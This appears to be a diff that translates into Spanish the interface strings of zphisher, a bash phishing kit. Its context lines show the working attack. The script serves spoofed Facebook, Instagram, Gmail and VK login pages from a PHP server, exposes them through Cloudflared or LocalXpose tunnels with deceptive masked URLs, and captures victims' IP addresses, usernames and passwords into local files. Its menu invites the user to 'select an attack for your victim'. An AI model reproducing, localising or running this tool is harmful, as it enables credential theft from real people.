@@ -132,12 +132,12 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa interrumpido." 2>&1; reset_color; }
 	exit 0
 }
 
 exit_on_signal_SIGTERM() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Terminado." 2>&1; reset_color; }
 	exit 0
 }
 
@@ -163,7 +163,7 @@ kill_pid() {
 
 # Check for a newer release
 check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Comprobación de actualización:"
 	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
 	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
@@ -229,27 +229,27 @@ banner_small() {
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando los paquetes necesarios..."
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalación del paquete : ${ORANGE}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
 
 		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalación del paquete : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
 	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Paquetes ya instalados."
 	else
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalación del paquete : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -263,7 +263,7 @@ dependencies() {
 				elif [[ $(command -v yum) ]]; then
 					sudo yum -y install "$pkg"
 				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Administrador de paquetes no compatible, instalar paquetes manualmente."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -295,7 +295,7 @@ download() {
 		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Se produjo un error durante la descarga ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -303,9 +303,9 @@ download() {
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared ya instalado."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -322,9 +322,9 @@ install_cloudflared() {
 ## Install LocalXpose
 install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose ya instalado."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -341,7 +341,7 @@ install_localxpose() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Gracias por utilizar esta herramienta. Que tengas un buen día.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -368,15 +368,15 @@ about() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleccione una opción: ${BLUE}"
 	case $REPLY in 
 		99)
 			msg_exit;;
 		0 | 00)
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Volviendo al menú principal..."
 			{ sleep 1; main_menu; };;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opción no válida, inténtelo nuevamente..."
 			{ sleep 1; about; };;
 	esac
 }
@@ -384,28 +384,28 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} ¿Quieres un puerto personalizado? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Ingrese su puerto personalizado de 4 dígitos [1024-9999] : ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
 		else
-			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Puerto de 4 dígitos no válido: $CU_P, Intentar otra vez...${WHITE}"
 			{ sleep 2; clear; banner_small; cusport; }
 		fi		
 	else 
-		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Usando el puerto predeterminado $PORT...${WHITE}\n"
 	fi
 }
 
 ## Setup website and start php server
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Configurando el servidor..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Iniciando el servidor PHP..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
@@ -413,8 +413,8 @@ setup_site() {
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} IP de la víctima : ${BLUE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Guardado en: ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -427,21 +427,21 @@ capture_creds() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Esperando la próxima información de inicio de sesión, ${BLUE}Ctrl + C ${ORANGE}para salir. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Esperando información de inicio de sesión, ${BLUE}Ctrl + C ${ORANGE}para salir..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} ¡IP de víctima encontrada!"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Información de inicio de sesión encontrada !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -453,9 +453,9 @@ capture_data() {
 start_cloudflared() { 
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Lanzamiento de Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -475,11 +475,11 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Crea una cuenta en ${ORANGE}localxpose.io${GREEN} & Copiar el token\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Token de entrada Loclx :${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Debes ingresar el token Localxpose." ; sleep 2 ; tunnel_menu
 		} || {
 			echo -n "$loclx_token" > $auth_f 2> /dev/null
 		}
@@ -489,12 +489,12 @@ localxpose_auth() {
 ## Start LocalXpose (Again...)
 start_loclx() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} ¿Cambiar la región del servidor Loclx? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Lanzando LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
@@ -511,10 +511,10 @@ start_loclx() {
 ## Start localhost
 start_localhost() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Alojado exitosamente en: ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
@@ -529,7 +529,7 @@ tunnel_menu() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleccione un servicio de reenvío de puertos: ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -539,7 +539,7 @@ tunnel_menu() {
 		3 | 03)
 			start_loclx;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opción no válida, inténtelo nuevamente..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
@@ -547,16 +547,16 @@ tunnel_menu() {
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} ¿Quieres cambiar la URL de la máscara? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Ingrese su URL personalizada a continuación ${CYAN}(${ORANGE}Ejemlo: https://get-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Uso de URL enmascaradas personalizadas :${GREEN} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Tipo de URL no válido..Usando el predeterminado.."
 		fi
 	fi
 }
@@ -595,8 +595,8 @@ custom_url() {
 		processed_url="https://$processed_url"
 	else
 		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
-		processed_url="Unable to Short URL"
+		url="No se pueden generar enlaces. Inténtelo después de activar el punto de acceso"
+		processed_url="No se puede acortar la URL"
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
@@ -608,14 +608,14 @@ custom_url() {
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de inicio de sesión tradicional
+		${RED}[${WHITE}02${RED}]${ORANGE} Página de inicio de sesión para la encuesta de votación avanzada
+		${RED}[${WHITE}03${RED}]${ORANGE} Página de inicio de sesión de seguridad falsa
+		${RED}[${WHITE}04${RED}]${ORANGE} Página de inicio de sesión de Facebook Messenger
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleccione una opción : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -635,7 +635,7 @@ site_facebook() {
 			mask='https://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opción no válida, inténtelo nuevamente..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -644,10 +644,10 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de inicio de sesión tradicional
+		${RED}[${WHITE}02${RED}]${ORANGE} Página de inicio de sesión de seguidores automáticos
+		${RED}[${WHITE}03${RED}]${ORANGE} Página de inicio de sesión para 1000 seguidores
+		${RED}[${WHITE}04${RED}]${ORANGE} Página de inicio de sesión de verificación de Blue Badge
 
 	EOF
 
@@ -671,7 +671,7 @@ site_instagram() {
 			mask='https://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opción no válida, inténtelo nuevamente..."
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
@@ -680,13 +680,13 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de inicio de sesión antigua de Gmail
+		${RED}[${WHITE}02${RED}]${ORANGE} Nueva página de inicio de sesión de Gmail
+		${RED}[${WHITE}03${RED}]${ORANGE} Encuesta de votación avanzada
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleccione una opción : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -702,7 +702,7 @@ site_gmail() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opción no válida, inténtelo nuevamente..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -711,12 +711,12 @@ site_gmail() {
 site_vk() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Página de inicio de sesión tradicional
+		${RED}[${WHITE}02${RED}]${ORANGE} Página de inicio de sesión para la encuesta de votación avanzada
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleccione una opción : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -728,7 +728,7 @@ site_vk() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opción no válida, inténtelo nuevamente..."
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
@@ -737,7 +737,7 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Seleccione un ataque para su víctima ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
@@ -752,11 +752,11 @@ main_menu() {
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} Acerca de         ${RED}[${WHITE}00${RED}]${ORANGE} Salie
 
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Seleccione una opción : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -896,7 +896,7 @@ main_menu() {
 		0 | 00 )
 			msg_exit;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opción no válida, inténtelo de nuevo..."
 			{ sleep 1; main_menu; };;
 	
 	esac
